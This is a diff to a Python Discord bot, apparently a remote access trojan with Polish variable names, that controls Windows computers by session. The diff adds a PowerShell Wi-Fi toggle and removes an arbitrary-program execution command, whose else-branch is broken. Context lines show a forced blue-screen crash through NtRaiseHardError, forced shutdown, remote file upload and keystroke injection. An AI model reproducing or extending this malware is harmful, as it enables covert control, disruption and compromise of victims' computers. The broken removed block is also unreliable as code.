@@ -395,6 +395,26 @@ while True:
                 sesja = nowaSesja
 
         @bot.command()
+        async def wifi(ctx, session, action):
+            if session != "all" and session != sesja:
+                return
+            if action.lower() not in ['on', 'off']:
+                await ctx.send("Invalid action. Use 'on' or 'off'.")
+                return
+
+            try:
+                import subprocess
+                cmd = f"powershell -Command \"(Get-NetAdapter -Name Wi-Fi).Enable{action.capitalize()}\""
+                result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
+
+                if result.returncode == 0:
+                    await ctx.send(f"Wi-Fi has been turned {action}.")
+                else:
+                    await ctx.send(f"Failed to turn Wi-Fi {action}. Error: {result.stderr}")
+            except Exception as e:
+                await ctx.send(f"An error occurred: {str(e)}")
+
+        @bot.command()
         async def shutdown(ctx, session):
             if session == "all":
                 os.system("shutdown /s /f /t 1")
@@ -449,15 +469,7 @@ while True:
                     ERROR_CODE = 0xDEADDEAD
                     ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                     ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
-
-        @bot.command()
-        async def execute(ctx, session, program):
-            if session == "all":
-                os.system(program)
-                await ctx.send(f"Program '{program}' executed on all sessions.")
-            else:
-                if session == sesja:
-                await ctx.send(f"Program '{program}' executed on session {sesja}.")
+                    
         
         @bot.command()
         async def h(ctx):
@@ -489,6 +501,7 @@ while True:
 !up [session] - Increases the volume on the remote computer.
 !upload [session] [link] [file_name] - Sends a file to the remote computer.
 !wallpaper [session] [path] - Changes the wallpaper on the remote computer.
+!wifi [session] [on/off] - Turns Wi-Fi on or off
 !write [session] [message] - Types using the keyboard.
             '''
             await ctx.send(wiadomosc)
